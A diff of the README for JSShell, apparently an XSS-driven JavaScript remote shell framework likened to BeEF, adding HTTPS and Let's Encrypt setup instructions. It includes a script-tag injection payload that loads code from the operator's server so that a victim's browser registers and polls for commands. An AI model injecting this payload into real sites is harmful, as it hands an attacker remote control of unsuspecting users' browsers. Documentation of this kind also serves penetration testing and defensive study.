@@ -27,6 +27,7 @@ Version 2.0 is created entirely from scratch, introducing new exciting features,
 * Injectable via `<script>` tags
 * Dumping command output to file
 * Shell pagination
+* HTTPS support! [![Generic badge](https://img.shields.io/badge/new-green.svg)](https://shields.io/)
 
 
 ## Installation & Setup
@@ -36,14 +37,33 @@ In the `resources` directory, update the `config.json` file with your desired co
 * Database host - if running with the `docker` deployment method, choose the database host as `db` 
 (which is the internal host name).
 * Return URL - the URL which the requests will follow. The `shell.js` file does some AJAX calls to register and poll
-for new commands. Usually it will be `http://{YOUR_SERVER_IP}:{PORT}`.
+for new commands. Usually it will be `http[s]://{YOUR_SERVER_IP}:{PORT}`.
 * Startup script - a script that runs automatically when the JSShell CLI client is spawned.
+* Domain - if you desire to generate TLS certificates, this is the domain name the server will use.
 * It is also possible to point at a remote database if desired.
 
 
+### Let's Encrypt
+Now JSShell supports TLS, which means you can now generate TLS certificates and feed them to the web server.
+The web server will infer the domain name from the `config.json` file. In order to creare the certificate,
+use the `create_cert.py` script in the `scripts` folder:
+
+```bash
+$ cd scripts
+$ python create_cert.py --domain <YOUR_DOMAIN> --email <YOUR_EMAIL>
+```
+
+##### the email field is optional.
+
+Please note that the web server must be down in order for the script to function properly. At this point, we have
+successfuly generated our certificates! The sole modifications we need to do are:
+* In the `config.json` file, change the schema of the `URL` field to `https`.
+* In the `docker-compose.yml` file change the exposed port of the `web` container to `443`.
+
+
 ### Docker
-This new version instructed installing and running via `docker` and `docker-compose`. Now, to install and run the entire
-JSShell framework, simply run:
+This new version supports installing and running JSShell via `docker` and `docker-compose`. Now, to install and run the
+entire JSShell framework, simply run:
 
 ```bash
 $ ./scripts/start_docker_shell.sh
@@ -136,10 +156,10 @@ Similar to other XSS control frameworks (like BeeF), JSShell is capable of manag
 In example, if you can inject a `script` tag, inject the following resource to your payload, and a new client will 
 appear in your console: 
 
-`<script src="http://{YOUR_SERVER_IP}:{PORT}/content/js"></script>`
+`<script src="http[s]://{YOUR_SERVER_IP}:{PORT}/content/js"></script>`
 
 ### Hosted Shell 
-If you desire to debug exotic and esoteric browsers, you can simply navigate to `http://{YOUR_SERVER_IP}:{PORT}/` and
+If you desire to debug exotic and esoteric browsers, you can simply navigate to `http[s]://{YOUR_SERVER_IP}:{PORT}/` and
 a new client will pop up into your JSShell CLI client. Now it is debuggable via our JSShell console.
 
 ## Credits
